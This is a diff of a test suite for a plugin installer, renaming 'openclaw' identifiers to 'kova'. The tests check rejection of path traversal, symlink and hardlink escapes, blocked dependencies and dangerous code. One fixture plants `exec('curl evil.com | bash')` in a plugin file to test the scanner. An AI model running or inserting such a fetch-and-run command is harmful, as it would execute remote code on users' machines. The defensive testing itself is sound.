@@ -3,7 +3,7 @@ import path from "node:path";
 import * as tar from "tar";
 import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
 import { safePathSegmentHashed } from "../infra/install-safe-path.js";
-import { resolveOpenClawPackageRootSync } from "../infra/openclaw-root.js";
+import { resolveKovaPackageRootSync } from "../infra/kova-root.js";
 import { runCommandWithTimeout } from "../process/exec.js";
 import { expectSingleNpmInstallIgnoreScriptsCall } from "../test-utils/exec-assertions.js";
 import { expectInstallUsesIgnoreScripts } from "../test-utils/npm-spec-install-test-helpers.js";
@@ -22,8 +22,8 @@ vi.mock("../process/exec.js", () => ({
   runCommandWithTimeout: vi.fn(),
 }));
 
-vi.mock("../infra/openclaw-root.js", () => ({
-  resolveOpenClawPackageRootSync: vi.fn(),
+vi.mock("../infra/kova-root.js", () => ({
+  resolveKovaPackageRootSync: vi.fn(),
 }));
 
 const resolveCompatibilityHostVersionMock = vi.fn();
@@ -53,7 +53,7 @@ const archiveFixturePathCache = new Map<string, string>();
 const dynamicArchiveTemplatePathCache = new Map<string, string>();
 let installPluginFromDirTemplateDir = "";
 let manifestInstallTemplateDir = "";
-const suiteTempRootTracker = createSuiteTempRootTracker("openclaw-plugin-install");
+const suiteTempRootTracker = createSuiteTempRootTracker("kova-plugin-install");
 const DYNAMIC_ARCHIVE_TEMPLATE_PRESETS = [
   {
     outName: "traversal.tgz",
@@ -61,7 +61,7 @@ const DYNAMIC_ARCHIVE_TEMPLATE_PRESETS = [
     packageJson: {
       name: "@evil/..",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      kova: { extensions: ["./dist/index.js"] },
     } as Record<string, unknown>,
   },
   {
@@ -70,14 +70,14 @@ const DYNAMIC_ARCHIVE_TEMPLATE_PRESETS = [
     packageJson: {
       name: "@evil/.",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      kova: { extensions: ["./dist/index.js"] },
     } as Record<string, unknown>,
   },
   {
     outName: "bad.tgz",
     withDistIndex: false,
     packageJson: {
-      name: "@openclaw/nope",
+      name: "@kovaai/nope",
       version: "0.0.1",
     } as Record<string, unknown>,
   },
@@ -252,7 +252,7 @@ function setupManifestInstallFixture(params: { manifestId: string; packageName?:
     fs.writeFileSync(packageJsonPath, JSON.stringify(manifest), "utf-8");
   }
   fs.writeFileSync(
-    path.join(pluginDir, "openclaw.plugin.json"),
+    path.join(pluginDir, "kova.plugin.json"),
     JSON.stringify({
       id: params.manifestId,
       configSchema: { type: "object", properties: {} },
@@ -265,12 +265,12 @@ function setupManifestInstallFixture(params: { manifestId: string; packageName?:
 function setPluginMinHostVersion(pluginDir: string, minHostVersion: string) {
   const packageJsonPath = path.join(pluginDir, "package.json");
   const manifest = JSON.parse(fs.readFileSync(packageJsonPath, "utf-8")) as {
-    openclaw?: { install?: Record<string, unknown> };
+    kova?: { install?: Record<string, unknown> };
   };
-  manifest.openclaw = {
-    ...manifest.openclaw,
+  manifest.kova = {
+    ...manifest.kova,
     install: {
-      ...manifest.openclaw?.install,
+      ...manifest.kova?.install,
       minHostVersion,
     },
   };
@@ -383,15 +383,15 @@ function setupDualFormatInstallFixture(params: { bundleFormat: "codex" | "claude
   fs.writeFileSync(
     path.join(pluginDir, "package.json"),
     JSON.stringify({
-      name: "@openclaw/native-dual",
+      name: "@kovaai/native-dual",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      kova: { extensions: ["./dist/index.js"] },
       dependencies: { "left-pad": "1.3.0" },
     }),
     "utf-8",
   );
   fs.writeFileSync(
-    path.join(pluginDir, "openclaw.plugin.json"),
+    path.join(pluginDir, "kova.plugin.json"),
     JSON.stringify({
       id: "native-dual",
       configSchema: { type: "object", properties: {} },
@@ -420,7 +420,7 @@ async function expectArchiveInstallReservedSegmentRejection(params: {
     packageJson: {
       name: params.packageName,
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      kova: { extensions: ["./dist/index.js"] },
     },
     outName: params.outName,
     withDistIndex: true,
@@ -514,7 +514,7 @@ async function ensureDynamicArchiveTemplate(params: {
     const packageName =
       typeof params.packageJson.name === "string" ? params.packageJson.name : "fixture-plugin";
     fs.writeFileSync(
-      path.join(pkgDir, "openclaw.plugin.json"),
+      path.join(pkgDir, "kova.plugin.json"),
       JSON.stringify({
         id: params.manifestId ?? packageName,
         configSchema: { type: "object", properties: {} },
@@ -547,9 +547,9 @@ beforeAll(async () => {
   fs.writeFileSync(
     path.join(installPluginFromDirTemplateDir, "package.json"),
     JSON.stringify({
-      name: "@openclaw/test-plugin",
+      name: "@kovaai/test-plugin",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      kova: { extensions: ["./dist/index.js"] },
       dependencies: { "left-pad": "1.3.0" },
     }),
     "utf-8",
@@ -565,9 +565,9 @@ beforeAll(async () => {
   fs.writeFileSync(
     path.join(manifestInstallTemplateDir, "package.json"),
     JSON.stringify({
-      name: "@openclaw/cognee-openclaw",
+      name: "@kovaai/cognee-kova",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      kova: { extensions: ["./dist/index.js"] },
     }),
     "utf-8",
   );
@@ -577,7 +577,7 @@ beforeAll(async () => {
     "utf-8",
   );
   fs.writeFileSync(
-    path.join(manifestInstallTemplateDir, "openclaw.plugin.json"),
+    path.join(manifestInstallTemplateDir, "kova.plugin.json"),
     JSON.stringify({
       id: "manifest-template",
       configSchema: { type: "object", properties: {} },
@@ -613,18 +613,18 @@ describe("installPluginFromArchive", () => {
     const archiveV1 = await ensureDynamicArchiveTemplate({
       outName: "voice-call-0.0.1.tgz",
       packageJson: {
-        name: "@openclaw/voice-call",
+        name: "@kovaai/voice-call",
         version: "0.0.1",
-        openclaw: { extensions: ["./dist/index.js"] },
+        kova: { extensions: ["./dist/index.js"] },
       },
       withDistIndex: true,
     });
     const archiveV2 = await ensureDynamicArchiveTemplate({
       outName: "voice-call-0.0.2.tgz",
       packageJson: {
-        name: "@openclaw/voice-call",
+        name: "@kovaai/voice-call",
         version: "0.0.2",
-        openclaw: { extensions: ["./dist/index.js"] },
+        kova: { extensions: ["./dist/index.js"] },
       },
       withDistIndex: true,
     });
@@ -634,7 +634,7 @@ describe("installPluginFromArchive", () => {
       archivePath: archiveV1,
       extensionsDir,
     });
-    expectSuccessfulArchiveInstall({ result: first, stateDir, pluginId: "@openclaw/voice-call" });
+    expectSuccessfulArchiveInstall({ result: first, stateDir, pluginId: "@kovaai/voice-call" });
 
     const duplicate = await installPluginFromArchive({
       archivePath: archiveV1,
@@ -660,7 +660,7 @@ describe("installPluginFromArchive", () => {
     expect(manifest.version).toBe("0.0.2");
   });
 
-  it("rejects native plugin zip archives without openclaw.plugin.json", async () => {
+  it("rejects native plugin zip archives without kova.plugin.json", async () => {
     const stateDir = suiteTempRootTracker.makeTempDir();
     const archivePath = getArchiveFixturePath({
       cacheKey: "zipper:0.0.1",
@@ -675,10 +675,10 @@ describe("installPluginFromArchive", () => {
     });
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.error).toContain("package missing valid openclaw.plugin.json");
+      expect(result.error).toContain("package missing valid kova.plugin.json");
       expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_PLUGIN_MANIFEST);
     }
-    expect(fs.existsSync(resolvePluginInstallDir("@openclaw/zipper", extensionsDir))).toBe(false);
+    expect(fs.existsSync(resolvePluginInstallDir("@kovaai/zipper", extensionsDir))).toBe(false);
   });
 
   it("allows archive installs with dangerous code patterns when forced unsafe install is set", async () => {
@@ -691,7 +691,7 @@ describe("installPluginFromArchive", () => {
       packageJson: {
         name: "dangerous-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["./dist/index.js"] },
+        kova: { extensions: ["./dist/index.js"] },
       },
       withDistIndex: true,
       distIndexJsContent: `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
@@ -713,12 +713,12 @@ describe("installPluginFromArchive", () => {
     ).toBe(true);
   });
 
-  it("installs flat-root plugin archives from ClawHub-style downloads", async () => {
+  it("installs flat-root plugin archives from KovaHub-style downloads", async () => {
     const result = await installArchivePackageAndReturnResult({
       packageJson: {
-        name: "@openclaw/rootless",
+        name: "@kovaai/rootless",
         version: "0.0.1",
-        openclaw: { extensions: ["./dist/index.js"] },
+        kova: { extensions: ["./dist/index.js"] },
       },
       outName: "rootless-plugin.tgz",
       withDistIndex: true,
@@ -742,31 +742,31 @@ describe("installPluginFromArchive", () => {
     }
   });
 
-  it("rejects packages without openclaw.extensions", async () => {
+  it("rejects packages without kova.extensions", async () => {
     const result = await installArchivePackageAndReturnResult({
-      packageJson: { name: "@openclaw/nope", version: "0.0.1" },
+      packageJson: { name: "@kovaai/nope", version: "0.0.1" },
       outName: "bad.tgz",
     });
     expect(result.ok).toBe(false);
     if (result.ok) {
       return;
     }
-    expect(result.error).toContain("openclaw.extensions");
-    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_OPENCLAW_EXTENSIONS);
+    expect(result.error).toContain("kova.extensions");
+    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_KOVA_EXTENSIONS);
   });
 
-  it("rejects legacy plugin package shape when openclaw.extensions is missing", async () => {
+  it("rejects legacy plugin package shape when kova.extensions is missing", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.writeFileSync(
       path.join(pluginDir, "package.json"),
       JSON.stringify({
-        name: "@openclaw/legacy-entry-fallback",
+        name: "@kovaai/legacy-entry-fallback",
         version: "0.0.1",
       }),
       "utf-8",
     );
     fs.writeFileSync(
-      path.join(pluginDir, "openclaw.plugin.json"),
+      path.join(pluginDir, "kova.plugin.json"),
       JSON.stringify({
         id: "legacy-entry-fallback",
         configSchema: { type: "object", properties: {} },
@@ -782,15 +782,15 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.error).toContain("package.json missing openclaw.extensions");
+      expect(result.error).toContain("package.json missing kova.extensions");
       expect(result.error).toContain("update the plugin package");
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_KOVA_EXTENSIONS);
       return;
     }
-    expect.unreachable("expected install to fail without openclaw.extensions");
+    expect.unreachable("expected install to fail without kova.extensions");
   });
 
-  it("rejects package installs when openclaw.extensions entries escape the package", async () => {
+  it("rejects package installs when kova.extensions entries escape the package", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.mkdirSync(path.join(pluginDir, "dist"), { recursive: true });
     fs.writeFileSync(
@@ -798,7 +798,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "escaping-entry-plugin",
         version: "1.0.0",
-        openclaw: {
+        kova: {
           extensions: ["../src/index.ts"],
           runtimeExtensions: ["./dist/index.js"],
         },
@@ -813,7 +813,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_KOVA_EXTENSIONS);
       expect(result.error).toContain("extension entry escapes plugin directory");
     }
   });
@@ -825,7 +825,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "missing-entry-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["./dist/index.js"] },
+        kova: { extensions: ["./dist/index.js"] },
       }),
     );
 
@@ -836,7 +836,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_KOVA_EXTENSIONS);
       expect(result.error).toContain("extension entry not found");
     }
   });
@@ -849,7 +849,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "inferred-runtime-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["./src/index.ts"] },
+        kova: { extensions: ["./src/index.ts"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "dist", "index.js"), "export {};\n");
@@ -873,7 +873,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "runtime-mismatch-plugin",
         version: "1.0.0",
-        openclaw: {
+        kova: {
           extensions: ["./src/one.ts", "./src/two.ts"],
           runtimeExtensions: ["./dist/one.js"],
         },
@@ -888,7 +888,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_KOVA_EXTENSIONS);
       expect(result.error).toContain("runtimeExtensions length (1)");
       expect(result.error).toContain("extensions length (2)");
     }
@@ -911,7 +911,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "symlink-entry-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["./linked/escape.js"] },
+        kova: { extensions: ["./linked/escape.js"] },
       }),
     );
 
@@ -922,7 +922,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_KOVA_EXTENSIONS);
       expect(result.error).toContain("extension entry");
     }
   });
@@ -950,7 +950,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hardlink-entry-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["./escape.js"] },
+        kova: { extensions: ["./escape.js"] },
       }),
     );
 
@@ -961,7 +961,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_KOVA_EXTENSIONS);
       expect(result.error).toContain("boundary checks");
     }
   });
@@ -974,7 +974,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -1001,7 +1001,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
         dependencies: {
           "plain-crypto-js": "^4.2.1",
         },
@@ -1031,7 +1031,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "aliased-blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
         dependencies: {
           "safe-name": "npm:plain-crypto-js@^4.2.1",
         },
@@ -1059,7 +1059,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "override-aliased-blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
         overrides: {
           "@scope/parent": {
             "safe-name": "npm:plain-crypto-js@^4.2.1",
@@ -1091,7 +1091,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "vendored-blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1125,7 +1125,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-package-dir-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1152,7 +1152,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-package-file-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1179,7 +1179,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-package-extensionless-file-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1208,7 +1208,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-symlink-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          kova: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1242,7 +1242,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-symlink-target-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          kova: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1276,7 +1276,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-file-symlink-target-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          kova: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1312,7 +1312,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-nested-file-symlink-target-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          kova: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1350,7 +1350,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "allowed-scoped-symlink-target-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          kova: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1379,7 +1379,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "outside-root-symlink-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          kova: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1410,7 +1410,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "non-node-modules-path-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1432,7 +1432,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "non-node-modules-file-alias-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1452,7 +1452,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "wide-vendored-tree-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1494,7 +1494,7 @@ describe("installPluginFromArchive", () => {
   });
 
   it("fails package installs when manifest traversal exceeds the directory cap", async () => {
-    vi.stubEnv("OPENCLAW_INSTALL_SCAN_MAX_DIRECTORIES", "4");
+    vi.stubEnv("KOVA_INSTALL_SCAN_MAX_DIRECTORIES", "4");
 
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.writeFileSync(
@@ -1502,7 +1502,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "directory-cap-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1522,7 +1522,7 @@ describe("installPluginFromArchive", () => {
   });
 
   it("fails package installs when manifest traversal exceeds the depth cap", async () => {
-    vi.stubEnv("OPENCLAW_INSTALL_SCAN_MAX_DEPTH", "2");
+    vi.stubEnv("KOVA_INSTALL_SCAN_MAX_DEPTH", "2");
 
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.writeFileSync(
@@ -1530,7 +1530,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "depth-cap-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1563,7 +1563,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "unreadable-dir-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          kova: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1599,7 +1599,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "multiple-blocked-dependencies-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
         dependencies: {
           "plain-crypto-js": "^4.2.1",
         },
@@ -1629,7 +1629,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -1661,7 +1661,7 @@ describe("installPluginFromArchive", () => {
       logger: { warn: vi.fn() },
       packageDir: pluginDir,
       pluginId: "qa-matrix",
-      packageName: "@openclaw/qa-matrix",
+      packageName: "@kovaai/qa-matrix",
       manifestId: "qa-matrix",
     });
 
@@ -1676,7 +1676,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "forced-blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
         dependencies: {
           "plain-crypto-js": "^4.2.1",
         },
@@ -1992,7 +1992,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hook-findings-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -2049,7 +2049,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-blocked-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -2109,7 +2109,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-forced-but-blocked-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -2152,7 +2152,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "fresh-force-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -2190,7 +2190,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "replace-force-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -2220,7 +2220,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hidden-entry-plugin",
         version: "1.0.0",
-        openclaw: { extensions: [".hidden/index.js"] },
+        kova: { extensions: [".hidden/index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -2247,7 +2247,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "scan-fail-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};");
@@ -2322,7 +2322,7 @@ describe("installPluginFromDir", () => {
   it("strips workspace devDependencies before npm install", async () => {
     const { pluginDir, extensionsDir } = setupInstallPluginFromDirFixture({
       devDependencies: {
-        openclaw: "workspace:*",
+        kova: "workspace:*",
         vitest: "^3.0.0",
       },
     });
@@ -2344,7 +2344,7 @@ describe("installPluginFromDir", () => {
     ) as {
       devDependencies?: Record<string, string>;
     };
-    expect(manifest.devDependencies?.openclaw).toBeUndefined();
+    expect(manifest.devDependencies?.kova).toBeUndefined();
     expect(manifest.devDependencies?.vitest).toBe("^3.0.0");
   });
 
@@ -2434,7 +2434,7 @@ describe("installPluginFromDir", () => {
     },
   );
 
-  it("uses openclaw.plugin.json id as install key when it differs from package name", async () => {
+  it("uses kova.plugin.json id as install key when it differs from package name", async () => {
     const { pluginDir, extensionsDir } = setupManifestInstallFixture({
       manifestId: "memory-cognee",
     });
@@ -2450,7 +2450,7 @@ describe("installPluginFromDir", () => {
     expect(
       infoMessages.some((msg) =>
         msg.includes(
-          'Plugin manifest id "memory-cognee" differs from npm package name "@openclaw/cognee-openclaw"',
+          'Plugin manifest id "memory-cognee" differs from npm package name "@kovaai/cognee-kova"',
         ),
       ),
     ).toBe(true);
@@ -2459,7 +2459,7 @@ describe("installPluginFromDir", () => {
   it("does not warn when a scoped npm package name matches the manifest id", async () => {
     const { pluginDir, extensionsDir } = setupManifestInstallFixture({
       manifestId: "matrix",
-      packageName: "@openclaw/matrix",
+      packageName: "@kovaai/matrix",
     });
 
     const infoMessages: string[] = [];
@@ -2489,7 +2489,7 @@ describe("installPluginFromDir", () => {
     {
       name: "package name keeps scoped plugin id by default",
       setup: () => setupInstallPluginFromDirFixture(),
-      expectedPluginId: "@openclaw/test-plugin",
+      expectedPluginId: "@kovaai/test-plugin",
       install: (pluginDir: string, extensionsDir: string) =>
         installPluginFromDir({
           dirPath: pluginDir,
@@ -2499,7 +2499,7 @@ describe("installPluginFromDir", () => {
     {
       name: "unscoped expectedPluginId resolves to scoped install id",
       setup: () => setupInstallPluginFromDirFixture(),
-      expectedPluginId: "@openclaw/test-plugin",
+      expectedPluginId: "@kovaai/test-plugin",
       install: (pluginDir: string, extensionsDir: string) =>
         installPluginFromDir({
           dirPath: pluginDir,
@@ -2603,8 +2603,8 @@ describe("installPluginFromDir", () => {
   });
 });
 
-describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
-  const resolveRootMock = vi.mocked(resolveOpenClawPackageRootSync);
+describe("linkKovaPeerDependencies (via installPluginFromDir)", () => {
+  const resolveRootMock = vi.mocked(resolveKovaPackageRootSync);
 
   function writePluginWithPeerDeps(
     pluginDir: string,
@@ -2616,7 +2616,7 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
       JSON.stringify({
         name: "peer-dep-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        kova: { extensions: ["index.js"] },
         peerDependencies,
       }),
       "utf-8",
@@ -2624,13 +2624,13 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n", "utf-8");
   }
 
-  it("creates a node_modules/openclaw symlink when peerDependencies declares openclaw", async () => {
+  it("creates a node_modules/kova symlink when peerDependencies declares kova", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     const fakeHostRoot = suiteTempRootTracker.makeTempDir();
     const run = vi.mocked(runCommandWithTimeout);
     resolveRootMock.mockReturnValue(fakeHostRoot);
 
-    writePluginWithPeerDeps(pluginDir, { openclaw: "*" });
+    writePluginWithPeerDeps(pluginDir, { kova: "*" });
 
     const { result } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
 
@@ -2639,7 +2639,7 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
       return;
     }
 
-    const symlinkPath = path.join(result.targetDir, "node_modules", "openclaw");
+    const symlinkPath = path.join(result.targetDir, "node_modules", "kova");
     const stat = fs.lstatSync(symlinkPath);
     expect(stat.isSymbolicLink()).toBe(true);
     expect(fs.realpathSync(symlinkPath)).toBe(fs.realpathSync(fakeHostRoot));
@@ -2661,7 +2661,7 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
       return;
     }
 
-    for (const peerName of ["getkova", "openclaw"]) {
+    for (const peerName of ["getkova", "kova"]) {
       const symlinkPath = path.join(result.targetDir, "node_modules", peerName);
       const stat = fs.lstatSync(symlinkPath);
       expect(stat.isSymbolicLink()).toBe(true);
@@ -2684,7 +2684,7 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
     }
 
     const nodeModulesDir = path.join(result.targetDir, "node_modules");
-    const symlinkPath = path.join(nodeModulesDir, "openclaw");
+    const symlinkPath = path.join(nodeModulesDir, "kova");
     expect(fs.existsSync(symlinkPath)).toBe(false);
   });
 
@@ -2693,7 +2693,7 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
     const fakeHostRoot = suiteTempRootTracker.makeTempDir();
     resolveRootMock.mockReturnValue(fakeHostRoot);
 
-    writePluginWithPeerDeps(pluginDir, { openclaw: "*" });
+    writePluginWithPeerDeps(pluginDir, { kova: "*" });
 
     // First install
